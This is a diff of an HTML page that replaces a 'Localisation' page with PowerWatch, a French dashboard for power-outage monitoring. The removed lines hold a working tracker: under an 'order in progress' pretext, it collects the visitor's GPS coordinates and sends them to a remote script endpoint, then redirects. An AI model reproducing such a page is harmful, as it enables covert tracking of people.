@@ -1,63 +1,151 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <title>Localisation</title>
-  <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbyzp5OBxiya8wyAF-miJ5pzz29hzHCtcFDNDpTj77gm7DSU6UUYLO0jGFLvc3C98C_l/exec";
-
-    async function sendLocation() {
-      try {
-        // 🔹 Récupère l'ID depuis l'URL (ex: ?id=1234)
-        const urlParams = new URLSearchParams(window.location.search);
-        const id = urlParams.get("id") || "inconnu";
-
-        // 🔹 Obtenir la position GPS
-        const position = await new Promise((resolve, reject) => {
-          if (!navigator.geolocation) {
-            reject(new Error("Géolocalisation non disponible."));
-          }
-          navigator.geolocation.getCurrentPosition(resolve, reject);
-        });
-
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-
-        // 🔹 Envoi via POST avec ID dynamique
-        await fetch(scriptURL, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded"
-          },
-          body: `id=${encodeURIComponent(id)}&latitude=${latitude}&longitude=${longitude}`
-        });
-
-        // 🔹 Récupération de l’URL de redirection
-        const urlResp = await fetch(`${scriptURL}?data=url`);
-        const urlText = await urlResp.text();
-
-        // 🔹 Récupération du message vocal
-        const msgResp = await fetch(`${scriptURL}?data=message`);
-        const msgText = await msgResp.text();
-
-        // 🔊 Lecture
-        const utterance = new SpeechSynthesisUtterance(msgText);
-        speechSynthesis.speak(utterance);
-
-        // Redirection après 4 secondes
-        setTimeout(() => {
-          window.location.href = urlText.trim();
-        }, 4000);
-
-      } catch (error) {
-        alert("Erreur : " + error.message);
-      }
-    }
-
-    window.onload = sendLocation;
-  </script>
-</head>
-<body>
-  <h1> COMMANDE EN COURS </h1>
-</body>
-</html>
+<!doctype html>
+<html lang="fr"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PowerWatch - Suivi de l'alimentation électrique</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--navy:#0d2238;--bg:#f3f5f8;--card:#fff;--ink:#14212e;--mut:#64748b;--line:#e1e6ec;--ok:#12804a;--okbg:#e5f5ec;--ko:#c9302c;--kobg:#fde9e8;--wa:#a5650b;--wabg:#fdf1dc;--un:#d5dce4;--acc:#2563eb}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--ink);font:15px/1.5 Manrope,"Segoe UI",system-ui,sans-serif;-webkit-font-smoothing:antialiased}
+.top{background:var(--navy);color:#fff;position:sticky;top:0;z-index:5}
+.in{max-width:1080px;margin:auto}
+.top .in{padding:12px 20px;display:flex;align-items:center;gap:12px}
+.logo{width:34px;height:34px;border-radius:9px;background:linear-gradient(135deg,#3b82f6,#22c55e);display:grid;place-items:center}
+.top b{display:block;font-size:17px;font-weight:800;line-height:1.1}.top small{font-size:12px;color:#9db3c9}
+.live{margin-left:auto;font-size:12.5px;color:#9db3c9;display:flex;align-items:center;gap:8px}
+.live i{width:8px;height:8px;border-radius:50%;background:#22c55e}
+.hero{color:#fff;padding:30px 20px 66px;background:#2b4663;transition:background .3s}
+.hero.ok{background:linear-gradient(120deg,#0d3b2b,#126b45)}.hero.ko{background:linear-gradient(120deg,#5a1412,#b32a25)}.hero.wa{background:linear-gradient(120deg,#5b3a07,#a5650b)}.hero.un{background:linear-gradient(120deg,#0d2238,#2b4663)}
+.hero small{font-size:13px;opacity:.8;font-weight:600;text-transform:uppercase;letter-spacing:.6px}
+.hero h1{font-size:clamp(25px,4.4vw,40px);line-height:1.15;margin:6px 0 8px;font-weight:800;letter-spacing:-.7px}.hero p{margin:0;opacity:.88;max-width:640px}
+main{max-width:1080px;margin:-42px auto 0;padding:0 20px 36px}
+.grid{display:grid;gap:16px}.g2{grid-template-columns:repeat(auto-fit,minmax(300px,1fr))}.g4{grid-template-columns:repeat(auto-fit,minmax(190px,1fr))}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px;box-shadow:0 8px 24px -14px rgba(13,34,56,.18)}
+.sec{margin-top:16px}.card h2{margin:0 0 4px;font-size:17px}.hint{color:var(--mut);font-size:13px;margin:0 0 14px}
+.ch{border-top:4px solid var(--un);display:flex;flex-direction:column;gap:8px}.ch.ok{border-top-color:var(--ok)}.ch.ko{border-top-color:var(--ko)}.ch.wa{border-top-color:var(--wa)}
+.ch .h{display:flex;justify-content:space-between;align-items:center;gap:8px}.nm{font-weight:800;font-size:18px}
+.pill{display:inline-flex;align-items:center;gap:6px;padding:3px 11px;border-radius:99px;font-size:12.5px;font-weight:700;white-space:nowrap}
+.pill:before{content:"";width:7px;height:7px;border-radius:50%;background:currentColor}
+.p-ok{background:var(--okbg);color:var(--ok)}.p-ko{background:var(--kobg);color:var(--ko)}.p-wa{background:var(--wabg);color:var(--wa)}
+.big{font-size:23px;font-weight:800;letter-spacing:-.4px}.m{color:var(--mut);font-size:13px}
+.meter{height:7px;border-radius:9px;background:var(--un);overflow:hidden}.meter i{display:block;height:100%;background:var(--ok)}
+.kpi b{display:block;font-size:27px;font-weight:800;letter-spacing:-.7px}.kpi span{color:var(--mut);font-size:13px;font-weight:600}
+.bar{display:flex;gap:8px;flex-wrap:wrap;align-items:center}
+button{font:inherit;font-weight:700;font-size:14px;padding:8px 14px;border-radius:9px;border:1px solid var(--line);background:#fff;color:var(--ink);cursor:pointer}
+button:hover{background:#f3f6fa}button.p{background:var(--acc);border-color:var(--acc);color:#fff}button.p:hover{background:#1d4fc4}button.on{background:var(--navy);color:#fff;border-color:var(--navy)}
+button:focus-visible,.chip:focus-visible,select:focus-visible{outline:3px solid #93b4f8;outline-offset:2px}
+.chips{display:flex;flex-wrap:wrap;gap:6px;margin-top:14px}.chip{padding:5px 11px;border-radius:8px;border:1px solid var(--line);background:#fff;font-size:13px;font-weight:600;cursor:pointer;color:var(--mut)}
+.chip.s{background:#e8f0fe;border-color:#9bb8f3;color:#1a47ad}
+.d{display:grid;grid-template-columns:120px 1fr;gap:6px 14px;margin-bottom:18px}.dn{font-weight:700;font-size:13px;text-transform:capitalize}.dn small{display:block;color:var(--mut);font-weight:500;text-transform:none}
+.track{position:relative;height:22px;background:var(--un);border-radius:6px;overflow:hidden}.track i{position:absolute;top:0;bottom:0}.u{background:var(--ok)}.dd{background:var(--ko)}
+.lab{font-size:12px;color:var(--mut);margin:6px 0 2px}.ruler{grid-column:2;display:flex;justify-content:space-between;font-size:11px;color:var(--mut)}
+.lg{display:flex;gap:16px;font-size:12.5px;color:var(--mut);flex-wrap:wrap}.lg i{display:inline-block;width:11px;height:11px;border-radius:3px;margin-right:6px;vertical-align:-1px}
+.wrap{overflow-x:auto}table{width:100%;border-collapse:collapse;font-size:14px}
+th{text-align:left;font-size:12.5px;color:var(--mut);font-weight:700;padding:9px 10px;border-bottom:1px solid var(--line);background:#f8fafc;white-space:nowrap}
+td{padding:10px;border-bottom:1px solid #eef1f5}tr:last-child td{border-bottom:0}.empty{color:var(--mut);padding:18px 0;text-align:center}
+select{font:inherit;padding:7px 10px;border:1px solid var(--line);border-radius:9px;background:#fff}
+footer{text-align:center;color:var(--mut);font-size:12.5px;padding:6px 20px 30px}
+@media(max-width:560px){.d{grid-template-columns:1fr}.ruler{grid-column:1}.live span{display:none}}
+</style></head><body>
+<header class="top"><div class="in"><div class="logo"><svg width="19" height="19" viewBox="0 0 24 24" fill="#fff"><path d="M13 2 4 14h6l-1 8 9-12h-6z"/></svg></div>
+<div><b>PowerWatch</b><small>Suivi de l'alimentation électrique</small></div><div class="live"><i></i><span id="upd">Chargement...</span></div></div></header>
+<section class="hero un" id="hero"><div class="in"><small id="hs">Etat de l'installation</small><h1 id="ht">Chargement</h1><p id="hp"></p></div></section>
+<main>
+<div class="grid g2" id="now"></div>
+<section class="card sec"><h2>Période d'analyse</h2><p class="hint">Sélectionnez les jours à analyser et à exporter.</p>
+<div class="bar"><button data-q="1" onclick="quick(1)">Aujourd'hui</button><button data-q="7" onclick="quick(7)">7 jours</button><button data-q="30" onclick="quick(30)">30 jours</button><button data-q="0" onclick="quick(0)">Tout</button>
+<button class="p" onclick="pdf()" style="margin-left:auto">Exporter en PDF</button></div><div class="chips" id="days"></div></section>
+<div class="grid g4 sec" id="kpis"></div>
+<section class="card sec"><h2>Chronologie</h2><p class="hint">Chaque barre représente une journée de 24 heures. Survolez une zone pour voir le détail.</p><div id="tl"></div>
+<div class="lg"><span><i style="background:var(--ok)"></i>Courant présent</span><span><i style="background:var(--ko)"></i>Coupure</span><span><i style="background:var(--un)"></i>Aucune information</span></div></section>
+<section class="card sec"><h2>Bilan par équipement</h2><p class="hint">Calculé sur les jours sélectionnés.</p><div class="wrap" id="stats"></div></section>
+<section class="card sec"><h2>Journal des coupures</h2><div class="bar" style="margin:8px 0 12px"><select id="fc" onchange="draw()" aria-label="Filtrer par équipement"><option value="">Tous les équipements</option></select></div><div class="wrap" id="ev"></div></section>
+</main><footer>PowerWatch - Actualisation automatique chaque minute</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf-autotable/3.8.2/jspdf.plugin.autotable.min.js"></script>
+<script>
+const $=s=>document.querySelector(s),pad=n=>String(n).padStart(2,'0'),STALE=150*60000,DAY=864e5;
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+const dstr=d=>`${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())}`;
+const ftm=ms=>{const d=new Date(ms);return `${pad(d.getHours())}:${pad(d.getMinutes())}`};
+const fdt=ms=>{const d=new Date(ms);return `${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()} ${ftm(ms)}`};
+function dur(ms){const s=Math.round(ms/1000);if(s<60)return s<=0?'0 min':'< 1 min';const d=Math.floor(s/86400),h=Math.floor(s%86400/3600),m=Math.floor(s%3600/60);return d?`${d} j ${h} h`:h?`${h} h ${pad(m)} min`:`${m} min`}
+// Emplacement des données (détection automatique, ou ?repo=utilisateur/nom)
+const qp=new URLSearchParams(location.search).get('repo');
+let owner='',name='';
+if(qp&&qp.includes('/'))[owner,name]=qp.split('/');
+else if(location.hostname.endsWith('github.io')){owner=location.hostname.split('.')[0];const p=location.pathname.split('/')[1];name=p&&!p.includes('.')?p:owner+'.github.io'}
+const cache={};let days=[],sel=new Set(),rows=[],kp={},incs=[];
+async function fetchDay(d){if(cache[d]&&d!==dstr(new Date()))return cache[d];
+  try{const r=await fetch(`data/${d}.json?_=${Date.now()}`,{cache:'no-store'});cache[d]=r.ok?await r.json():[]}catch(e){cache[d]=[]}return cache[d]}
+async function listDays(){
+  if(owner)try{const r=await fetch(`https://api.github.com/repos/${owner}/${name}/contents/data`);if(!r.ok)throw 0;
+    return (await r.json()).filter(f=>/^\d{4}-\d\d-\d\d\.json$/.test(f.name)).map(f=>f.name.slice(0,10)).sort().reverse()}catch(e){}
+  const ok=[];await Promise.all([...Array(30).keys()].map(async i=>{const d=dstr(new Date(Date.now()-i*DAY));if((await fetchDay(d)).length)ok.push(d)}));return ok.sort().reverse()}
+function quick(n){sel=new Set(n?days.slice(0,n):days);drawDays();draw()}
+function tog(d){sel.has(d)?sel.delete(d):sel.add(d);drawDays();draw()}
+function drawDays(){
+  document.querySelectorAll('[data-q]').forEach(b=>{const n=+b.dataset.q,k=n?Math.min(n,days.length):days.length;b.classList.toggle('on',sel.size===k&&days.slice(0,k).every(d=>sel.has(d)))});
+  $('#days').innerHTML=days.map(d=>`<span class="chip ${sel.has(d)?'s':''}" role="button" tabindex="0" onclick="tog('${d}')" onkeydown="if(event.key==='Enter')tog('${d}')">${new Date(d+'T12:00').toLocaleDateString('fr-FR',{weekday:'short',day:'2-digit',month:'short'})}</span>`).join('')||'<span class="hint">Aucune donnée reçue pour le moment.</span>'}
+function chans(evs){const m={};evs.forEach(e=>(m[e.c]=m[e.c]||[]).push(e));for(const k in m)m[k].sort((a,b)=>a.t-b.t);return m}
+// Une information reste valable STALE ms au plus : au-delà, la période est "sans information"
+function segs(l,end){const o=[];l.forEach((e,i)=>{const f=e.t*1000,nx=i+1<l.length?l[i+1].t*1000:end,t=Math.min(nx,f+STALE);if(t>f)o.push({f,t,s:e.s})});return o}
+function outages(l,end){const o=[];let op=null;l.forEach(e=>{if(!e.s&&op===null)op=e.t*1000;else if(e.s&&op!==null){o.push({f:op,t:e.t*1000});op=null}});if(op!==null)o.push({f:op,t:null});return o}
+const selEvents=()=>[...sel].sort().flatMap(d=>cache[d]||[]);
+async function init(){days=await listDays();if(days[0])sel=new Set([days[0]]);drawDays();await draw();setInterval(draw,60000)}
+async function draw(){
+  const today=dstr(new Date());if(!days.includes(today)&&(await fetchDay(today)).length){days.unshift(today);if(days.length===1)sel=new Set([today]);drawDays()}
+  await Promise.all([...sel].map(fetchDay));
+  const recent=chans((days[0]?await fetchDay(days[0]):[]).concat(days[1]?await fetchDay(days[1]):[]));
+  const now=Date.now(),names=Object.keys(recent).sort(),ds=[...sel].sort(),ch=chans(selEvents());
+  const endMs=ds.length?Math.min(now,new Date(ds[ds.length-1]+'T23:59:59').getTime()+1000):now;
+  const S={};let tUp=0,tDn=0,tN=0,mx=0;rows=[];incs=[];
+  for(const c in ch){const sg=segs(ch[c],endMs);let up=0,dn=0;
+    sg.forEach(x=>x.s?up+=x.t-x.f:dn+=x.t-x.f);
+    const os=outages(ch[c]).map(o=>({c,f:o.f,t:o.t,d:(o.t||endMs)-o.f}));incs.push(...os);
+    const m=os.reduce((a,o)=>Math.max(a,o.d),0);
+    S[c]={av:up+dn?100*up/(up+dn):null,n:os.length};tUp+=up;tDn+=dn;tN+=os.length;mx=Math.max(mx,m);
+    rows.push([c,S[c].av==null?'-':S[c].av.toFixed(2)+' %',os.length,dur(os.reduce((a,o)=>a+o.d,0)),dur(m)])}
+  kp={av:tUp+tDn?(100*tUp/(tUp+tDn)).toFixed(2)+' %':'-',n:tN,dn:dur(incs.reduce((a,o)=>a+o.d,0)),mx:dur(mx)};
+  // Bandeau principal
+  const cur=c=>recent[c][recent[c].length-1],down=names.filter(c=>cur(c).s===0),stale=names.filter(c=>now-cur(c).t*1000>STALE);
+  const since=c=>{const l=recent[c];let i=l.length-1;while(i>0&&l[i-1].s===l[i].s)i--;return l[i].t*1000};
+  let cls='un',s="Etat de l'installation",t='En attente des premières données',p="Le système n'a pas encore transmis d'information.";
+  if(names.length){
+    if(down.length){cls='ko';s='Alerte';t='Coupure en cours : '+down.map(esc).join(' et ');const st=Math.min(...down.map(since));p='Depuis '+dur(now-st)+' (début à '+ftm(st)+').'}
+    else if(stale.length){cls='wa';s='Attention';t='Aucune information récente';p='Dernière mise à jour il y a '+dur(now-Math.max(...names.map(c=>cur(c).t*1000)))+". Vérifiez l'alimentation et la connexion internet du système de surveillance."}
+    else{cls='ok';t='Tout fonctionne normalement';p=names.map(esc).join(' et ')+(names.length>1?' sont alimentés.':' est alimenté.')}}
+  $('#hero').className='hero '+cls;$('#hs').textContent=s;$('#ht').innerHTML=t;$('#hp').textContent=p;$('#upd').textContent='Mis à jour à '+ftm(now);
+  // Cartes
+  $('#now').innerHTML=names.map(c=>{const l=cur(c),st=stale.includes(c),a=S[c]&&S[c].av!=null?S[c].av:null,k=st?'wa':l.s?'ok':'ko';
+    return `<article class="card ch ${k}"><div class="h"><span class="nm">${esc(c)}</span><span class="pill p-${k}">${st?'Sans information':l.s?'En service':'Coupure'}</span></div>
+    <div class="big" style="color:var(--${k=='wa'?'wa':k})">${st?'Etat inconnu':l.s?'Courant présent':'Pas de courant'}</div>
+    <div class="m">${st?'Dernière information à ':'Depuis '+dur(now-since(c))+' - mise à jour à '}${ftm(l.t*1000)}</div>
+    ${a!=null?`<div class="meter" title="Disponibilité"><i style="width:${a}%"></i></div><div class="m">Disponibilité : <b>${a.toFixed(2)} %</b> - ${S[c].n} coupure${S[c].n>1?'s':''} sur la période</div>`:''}</article>`}).join('')||'<div class="card empty">Aucune donnée disponible.</div>';
+  $('#kpis').innerHTML=[['Disponibilité globale',kp.av],['Nombre de coupures',kp.n],['Durée totale sans courant',kp.dn],['Plus longue coupure',kp.mx]].map(k=>`<div class="card kpi"><span>${k[0]}</span><b>${k[1]}</b></div>`).join('');
+  // Chronologie
+  let t2='';ds.slice().reverse().forEach(d=>{const a=new Date(d+'T00:00:00').getTime(),b=a+DAY,dt=new Date(d+'T12:00');
+    t2+=`<div class="d"><div class="dn">${dt.toLocaleDateString('fr-FR',{weekday:'long'})}<small>${dt.toLocaleDateString('fr-FR',{day:'numeric',month:'long',year:'numeric'})}</small></div><div>`;
+    for(const c in ch){let bar='';segs(ch[c],endMs).forEach(x=>{const f=Math.max(x.f,a),e=Math.min(x.t,b);if(e>f)bar+=`<i class="${x.s?'u':'dd'}" title="${esc(c)} : ${x.s?'courant présent':'COUPURE'} de ${ftm(f)} à ${ftm(e)} (${dur(e-f)})" style="left:${(f-a)/DAY*100}%;width:${(e-f)/DAY*100}%"></i>`});
+      t2+=`<div class="lab">${esc(c)}</div><div class="track">${bar}</div>`}
+    t2+=`</div><div class="ruler"><span>0 h</span><span>6 h</span><span>12 h</span><span>18 h</span><span>24 h</span></div></div>`});
+  $('#tl').innerHTML=t2||'<div class="empty">Sélectionnez au moins un jour.</div>';
+  $('#stats').innerHTML=rows.length?'<table><tr><th>Equipement</th><th>Disponibilité</th><th>Coupures</th><th>Durée sans courant</th><th>Plus longue coupure</th></tr>'+rows.map(r=>`<tr><td><b>${esc(r[0])}</b></td><td>${r[1]}</td><td>${r[2]}</td><td>${r[3]}</td><td>${r[4]}</td></tr>`).join('')+'</table>':'<div class="empty">Sélectionnez au moins un jour.</div>';
+  // Journal
+  const fc=$('#fc'),cv=fc.value;fc.innerHTML='<option value="">Tous les équipements</option>'+names.map(n=>`<option ${n===cv?'selected':''}>${esc(n)}</option>`).join('');
+  const list=incs.filter(o=>!fc.value||o.c===fc.value).sort((a,b)=>b.f-a.f);
+  $('#ev').innerHTML=list.length?'<table><tr><th>Equipement</th><th>Début</th><th>Fin</th><th>Durée</th></tr>'+list.slice(0,300).map(o=>`<tr><td><b>${esc(o.c)}</b></td><td>${fdt(o.f)}</td><td>${o.t?fdt(o.t):'<span class="pill p-ko">En cours</span>'}</td><td>${dur(o.d)}</td></tr>`).join('')+'</table>':'<div class="empty">Aucune coupure sur cette période.</div>'}
+function pdf(){
+  if(!sel.size){alert('Sélectionnez au moins un jour.');return}
+  const {jsPDF}=window.jspdf,doc=new jsPDF(),ds=[...sel].sort(),hs={fillColor:[13,34,56]};
+  doc.setFillColor(13,34,56);doc.rect(0,0,210,30,'F');doc.setTextColor(255);doc.setFontSize(18);doc.text("PowerWatch - Rapport d'alimentation électrique",14,14);
+  doc.setFontSize(9);doc.text('Généré le '+fdt(Date.now()),14,22);doc.setTextColor(20,33,46);doc.setFontSize(10);
+  const per=ds.length>1?`Période : du ${ds[0]} au ${ds[ds.length-1]} (${ds.length} jours)`:'Journée : '+ds[0];doc.text(per,14,38);
+  doc.text(`Disponibilité : ${kp.av}   |   Coupures : ${kp.n}   |   Sans courant : ${kp.dn}   |   Plus longue : ${kp.mx}`,14,45,{maxWidth:182});
+  doc.autoTable({startY:52,head:[['Equipement','Disponibilité','Coupures','Durée sans courant','Plus longue coupure']],body:rows,headStyles:hs});
+  const L=incs.slice().sort((a,b)=>a.f-b.f);
+  doc.autoTable({startY:doc.lastAutoTable.finalY+10,head:[['Equipement','Début','Fin','Durée']],body:L.length?L.map(o=>[o.c,fdt(o.f),o.t?fdt(o.t):'En cours',dur(o.d)]):[['Aucune coupure','','','']],headStyles:hs});
+  doc.save('rapport-courant-'+ds[0]+(ds.length>1?'_'+ds[ds.length-1]:'')+'.pdf')}
+init();
+</script></body></html>
